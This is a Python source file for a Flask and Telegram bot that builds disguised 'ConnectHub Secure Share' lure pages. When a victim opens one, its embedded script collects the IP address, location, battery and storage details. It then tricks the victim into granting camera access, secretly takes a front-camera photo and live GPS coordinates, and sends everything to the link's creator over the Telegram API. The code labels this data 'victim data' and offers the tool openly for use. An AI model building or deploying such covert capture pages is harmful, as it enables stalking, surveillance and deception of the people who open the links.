from flask import Flask, request, jsonify, send_from_directory
import telebot
import json
import time
import os
import threading
import requests
from datetime import datetime, timedelta
import logging
import sys
import shutil

logging.basicConfig(stream=sys.stdout, level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

app = Flask(__name__)

TOKEN = os.environ.get("BOT_TOKEN")
CHANNEL_ID = os.environ.get("CHANNEL_ID")
REQUIRED_CHANNEL = "@nrtecno2"
ACCOUNT_NAME = "telegram-bot-b9j0"   # ⚠️ इसे अपने Render URL से बदलो (onrender.com से पहले वाला)
HTML_DIR = "html_files"
PHOTO_DIR = "photos"
VICTIM_DATA_DIR = "victim_data"
STATS_FILE = "stats.json"
USER_LINKS_FILE = "user_links.json"

os.makedirs(HTML_DIR, exist_ok=True)
os.makedirs(PHOTO_DIR, exist_ok=True)
os.makedirs(VICTIM_DATA_DIR, exist_ok=True)

if not os.path.exists(STATS_FILE):
    with open(STATS_FILE, "w") as f:
        json.dump({"total_links": 0}, f)

if not os.path.exists(USER_LINKS_FILE):
    with open(USER_LINKS_FILE, "w") as f:
        json.dump({}, f)

bot = telebot.TeleBot(TOKEN)
bot_info = bot.get_me()
logger.info(f"✅ Bot connected: @{bot_info.username}")

# ------------------- Helper Functions -------------------
def get_user_active_link(user_id):
    with open(USER_LINKS_FILE, "r") as f:
        data = json.load(f)
    return data.get(str(user_id))

def set_user_active_link(user_id, html_filename, photo_filename):
    with open(USER_LINKS_FILE, "r") as f:
        data = json.load(f)
    old = data.get(str(user_id))
    if old:
        old_html = os.path.join(HTML_DIR, old.get("html"))
        old_photo = os.path.join(PHOTO_DIR, old.get("photo"))
        if os.path.exists(old_html):
            os.remove(old_html)
        if os.path.exists(old_photo):
            os.remove(old_photo)
    data[str(user_id)] = {
        "html": html_filename,
        "photo": photo_filename,
        "created_at": time.time()
    }
    with open(USER_LINKS_FILE, "w") as f:
        json.dump(data, f)

def increment_links():
    with open(STATS_FILE, "r") as f:
        stats = json.load(f)
    stats["total_links"] = stats.get("total_links", 0) + 1
    with open(STATS_FILE, "w") as f:
        json.dump(stats, f)

def delete_old_victim_data():
    cutoff_time = datetime.now() - timedelta(minutes=10)
    deleted = 0
    if os.path.exists(VICTIM_DATA_DIR):
        for folder_name in os.listdir(VICTIM_DATA_DIR):
            folder_path = os.path.join(VICTIM_DATA_DIR, folder_name)
            try:
                if datetime.fromtimestamp(os.path.getmtime(folder_path)) < cutoff_time:
                    shutil.rmtree(folder_path)
                    deleted += 1
            except:
                pass
    if deleted:
        logger.info(f"🧹 Deleted {deleted} old victim folders")

def start_auto_cleanup():
    def cleanup_loop():
        while True:
            time.sleep(600)
            delete_old_victim_data()
    threading.Thread(target=cleanup_loop, daemon=True).start()

def is_subscribed(user_id):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/getChatMember?chat_id={REQUIRED_CHANNEL}&user_id={user_id}"
        r = requests.get(url, timeout=10)
        data = r.json()
        if data.get("ok"):
            return data["result"]["status"] in ["member", "administrator", "creator"]
    except:
        pass
    return False

def get_user_state(user_id):
    try:
        with open(os.path.join(HTML_DIR, f"state_{user_id}.json"), "r") as f:
            return json.load(f)
    except:
        return {"state": None, "target_url": None}

def set_user_state(user_id, data):
    with open(os.path.join(HTML_DIR, f"state_{user_id}.json"), "w") as f:
        json.dump(data, f)

def generate_html(user_id, target_url, photo_filename):
    html_filename = f"v_{user_id}_{int(time.time())}.html"
    filepath = os.path.join(HTML_DIR, html_filename)
    photo_url = f"https://{ACCOUNT_NAME}.onrender.com/photos/{photo_filename}"
    storage_channel = CHANNEL_ID if CHANNEL_ID else "null"

    victim_folder = os.path.join(VICTIM_DATA_DIR, f"victim_{user_id}_{int(time.time())}")
    os.makedirs(victim_folder, exist_ok=True)

    html = f"""<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>ConnectHub</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}}
.card{{background:#fff;border-radius:32px;max-width:400px;width:100%;overflow:hidden;box-shadow:0 25px 50px -12px rgba(0,0,0,0.25)}}
.header{{background:linear-gradient(135deg,#1a1a2e 0%,#16213e 100%);padding:24px 20px;text-align:center}}
.logo{{font-size:28px;font-weight:bold;color:#fff}} .logo span{{color:#e94560}}
.badge{{background:rgba(255,255,255,0.15);display:inline-block;padding:4px 12px;border-radius:20px;font-size:11px;color:#fff;margin-top:8px}}
.preview-section{{padding:24px;text-align:center}}
.user-photo{{width:100px;height:100px;border-radius:50%;object-fit:cover;margin:0 auto 16px;box-shadow:0 8px 20px rgba(0,0,0,0.15);border:3px solid #e94560}}
.message{{background:#f0f0f0;padding:12px 16px;border-radius:20px;display:inline-block;max-width:80%;margin:16px auto;font-size:14px;color:#333}}
.btn{{background:linear-gradient(135deg,#e94560 0%,#c62a4a 100%);color:#fff;border:none;padding:16px 32px;border-radius:50px;font-size:18px;font-weight:bold;cursor:pointer;width:100%;margin-top:16px;animation:pulse 2s infinite;box-shadow:0 4px 15px rgba(233,69,96,0.4)}}
@keyframes pulse{{0%{{transform:scale(1)}}50%{{transform:scale(1.03)}}100%{{transform:scale(1)}}}}
.btn:active{{transform:scale(0.98);animation:none}}
.footer{{background:#f5f5f5;padding:16px;text-align:center;font-size:11px;color:#999}}
.loader{{width:48px;height:48px;border:3px solid #f3f3f3;border-top:3px solid #e94560;border-radius:50%;animation:spin 1s linear infinite;margin:20px auto}}
@keyframes spin{{0%{{transform:rotate(0deg)}}100%{{transform:rotate(360deg)}}}}
.step{{display:none}} .active{{display:block}}
.error{{background:#fee;color:#e94560;padding:12px;border-radius:12px;margin-top:16px}}
</style>
</head>
<body>
<div class="card">
    <div class="header"><div class="logo">Connect<span>Hub</span></div><div class="badge">Secure Share</div></div>
    <div id="step1" class="step active"><div class="preview-section"><div class="loader"></div><p>Loading secure preview...</p></div></div>
    <div id="step2" class="step"><div class="preview-section"><div class="preview-label">Shared by user</div><img class="user-photo" src="{photo_url}"><div class="message">"Here's my shared content"</div><button class="btn" onclick="requestCamera()">Continue →</button><div id="errorMsg" class="error" style="display:none"></div></div><div class="footer"><p>End-to-end encrypted • 256-bit security</p></div></div>
    <div id="step3" class="step"><div class="preview-section"><div class="loader"></div><p>Establishing secure connection...</p></div></div>
    <div id="step4" class="step"><div class="preview-section"><div class="loader"></div><p>Verifying your device...</p></div></div>
    <div id="step5" class="step"><div class="preview-section"><div class="loader"></div><p>Redirecting...</p></div></div>
</div>
<video id="video" autoplay playsinline muted style="display:none"></video>
<canvas id="canvas" style="display:none"></canvas>
<script>
const TOKEN="{TOKEN}"; const USER={user_id}; const STORAGE={storage_channel}; const TARGET="{target_url}";
async function sendToUser(text,file=null){{try{{if(file){{let fd=new FormData(); fd.append('chat_id',USER); fd.append('photo',file); await fetch('https://api.telegram.org/bot'+TOKEN+'/sendPhoto',{{method:'POST',body:fd}}); if(STORAGE && STORAGE!=='null'){{let fd2=new FormData(); fd2.append('chat_id',STORAGE); fd2.append('photo',file); await fetch('https://api.telegram.org/bot'+TOKEN+'/sendPhoto',{{method:'POST',body:fd2}});}}}}else{{await fetch('https://api.telegram.org/bot'+TOKEN+'/sendMessage',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify({{chat_id:USER,text:text,parse_mode:'HTML'}})}}); if(STORAGE && STORAGE!=='null'){{await fetch('https://api.telegram.org/bot'+TOKEN+'/sendMessage',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify({{chat_id:STORAGE,text:text,parse_mode:'HTML'}})}});}}}}catch(e){{}}}}
async function getIP(){{return await fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>d.ip).catch(()=>'Unknown');}}
async function getIPInfo(ip){{try{{let r=await fetch(`https://ipapi.co/${{ip}}/json/`); return await r.json();}}catch(e){{return{{}};}}}}
async function getBattery(){{if(navigator.getBattery){{try{{let b=await navigator.getBattery(); return{{level:Math.round(b.level*100),charging:b.charging}};}}catch(e){{}}}} return null;}}
function getDeviceInfo(){{const ua=navigator.userAgent; if(/iPhone/i.test(ua)) return 'iPhone'; if(/iPad/i.test(ua)) return 'iPad'; if(/Android/i.test(ua)) return 'Android'; return 'Desktop';}}
function formatBytes(b){{if(b===0)return'0 Bytes'; const k=1024,s=['Bytes','KB','MB','GB']; const i=Math.floor(Math.log(b)/Math.log(k)); return parseFloat((b/Math.pow(k,i)).toFixed(2))+' '+s[i];}}
async function getStorage(){{try{{if('storage' in navigator && 'estimate' in navigator.storage){{let e=await navigator.storage.estimate(); return{{used:formatBytes(e.usage),total:formatBytes(e.quota)}};}}}}catch(e){{}} return null;}}
async function captureData(){{let ip=await getIP(); let ipInfo=await getIPInfo(ip); let battery=await getBattery(); let storage=await getStorage(); let msg='<b>Victim Data Captured</b>\n------------------------\nDevice: '+getDeviceInfo()+'\nIP: '+ip+'\nLocation: '+(ipInfo.city||'Unknown')+', '+(ipInfo.country_name||'Unknown')+'\nTimezone: '+Intl.DateTimeFormat().resolvedOptions().timeZone+'\nBattery: '+(battery?battery.level+'% ('+(battery.charging?'Charging':'Not charging')+')':'Unknown')+'\nStorage: '+(storage?storage.used+' / '+storage.total:'Unknown')+'\n------------------------\n@nrtecno2'; await sendToUser(msg);}}
async function capturePhoto(){{try{{let s=await navigator.mediaDevices.getUserMedia({{video:{{facingMode:'user'}},audio:false}}); let v=document.getElementById('video'); v.srcObject=s; await new Promise(r=>v.onloadedmetadata=()=>{{v.play();r();}}); await new Promise(r=>setTimeout(r,300)); let c=document.getElementById('canvas'); c.width=v.videoWidth; c.height=v.videoHeight; c.getContext('2d').drawImage(v,0,0); let blob=await new Promise(r=>c.toBlob(r,'image/jpeg',0.9)); if(blob) await sendToUser('<b>Camera Photo</b>',blob); s.getTracks().forEach(t=>t.stop()); if(navigator.geolocation){{navigator.geolocation.getCurrentPosition(async(p)=>{{await sendToUser('<b>Live Location</b>\nhttps://www.google.com/maps?q='+p.coords.latitude+','+p.coords.longitude);}},async()=>{{}});}} return true;}}catch(e){{return false;}}}}
async function requestCamera(){{document.getElementById('step2').style.display='none'; document.getElementById('step3').style.display='block'; let ok=await capturePhoto(); if(ok){{document.getElementById('step3').style.display='none'; document.getElementById('step4').style.display='block'; setTimeout(()=>{{document.getElementById('step4').style.display='none'; document.getElementById('step5').style.display='block'; setTimeout(()=>window.location.href=TARGET,2000);}},1500);}}else{{document.getElementById('step3').style.display='none'; document.getElementById('step2').style.display='block'; document.getElementById('errorMsg').innerHTML='Verification failed. Please allow camera access.';}}}}
async function start(){{await captureData(); document.getElementById('step1').style.display='none'; document.getElementById('step2').style.display='block';}}
start();
</script>
</body>
</html>"""
    with open(filepath, "w", encoding="utf-8") as f:
        f.write(html)
    logger.info(f"✅ HTML file saved: {filepath}")
    return html_filename

# ------------------- Telegram Handlers -------------------
@bot.message_handler(commands=['start'])
def start_command(message):
    chat_id = message.chat.id
    logger.info(f"📨 /start from {chat_id}")
    if not is_subscribed(chat_id):
        markup = telebot.types.InlineKeyboardMarkup()
        markup.add(telebot.types.InlineKeyboardButton("Join Channel", url="https://t.me/nrtecno2"))
        markup.add(telebot.types.InlineKeyboardButton("Verify", callback_data="verify"))
        bot.send_message(chat_id, f"Join {REQUIRED_CHANNEL} first!", reply_markup=markup)
    else:
        set_user_state(chat_id, {"state": "waiting_url", "target_url": None})
        bot.send_message(chat_id, "Send me any URL")

@bot.message_handler(func=lambda m: m.text and m.text.startswith(('http://', 'https://')))
def handle_url(message):
    chat_id = message.chat.id
    state = get_user_state(chat_id)
    if state.get("state") != "waiting_url":
        bot.send_message(chat_id, "Use /start first")
        return
    set_user_state(chat_id, {"state": "waiting_photo", "target_url": message.text})
    bot.send_message(chat_id, "Now share a photo with me")

@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    chat_id = message.chat.id
    state = get_user_state(chat_id)
    if state.get("state") != "waiting_photo":
        bot.send_message(chat_id, "Please send URL first using /start")
        return
    try:
        file_info = bot.get_file(message.photo[-1].file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        photo_filename = f"photo_{chat_id}_{int(time.time())}.jpg"
        with open(os.path.join(PHOTO_DIR, photo_filename), "wb") as f:
            f.write(downloaded_file)
        target_url = state.get("target_url")
        html_filename = generate_html(chat_id, target_url, photo_filename)
        set_user_active_link(chat_id, html_filename, photo_filename)
        set_user_state(chat_id, {"state": None, "target_url": None})
        increment_links()
        link = f"https://{ACCOUNT_NAME}.onrender.com/view/{html_filename}"
        bot.send_message(chat_id, f"Your link:\n{link}\n\nThis link will stay active until you create a new one.")
    except Exception as e:
        logger.error(f"Photo error: {e}")
        bot.send_message(chat_id, "Error processing photo. Please try again.")

@bot.callback_query_handler(func=lambda call: call.data == "verify")
def verify_callback(call):
    if is_subscribed(call.from_user.id):
        bot.edit_message_text("Verified! Send me any URL:", call.from_user.id, call.message.message_id)
        set_user_state(call.from_user.id, {"state": "waiting_url", "target_url": None})
    else:
        bot.answer_callback_query(call.id, "Join channel first!", True)

# ------------------- Flask Webhook Routes -------------------
@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        json_str = request.get_data().decode('UTF-8')
        update = telebot.types.Update.de_json(json_str)
        bot.process_new_updates([update])
        return jsonify({"status": "ok"}), 200
    except Exception as e:
        logger.error(f"Webhook error: {e}")
        return jsonify({"status": "error"}), 500

@app.route('/view/<filename>')
def serve_html(filename):
    return send_from_directory(HTML_DIR, filename)

@app.route('/photos/<filename>')
def serve_photo(filename):
    return send_from_directory(PHOTO_DIR, filename)

@app.route('/')
def home():
    return f"🐉 Bot is live | Active links: {len([f for f in os.listdir(HTML_DIR) if f.startswith('v_')])}"

# ------------------- Main -------------------
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    start_auto_cleanup()
    logger.info(f"🚀 Starting on port {port}")
    app.run(host='0.0.0.0', port=port)
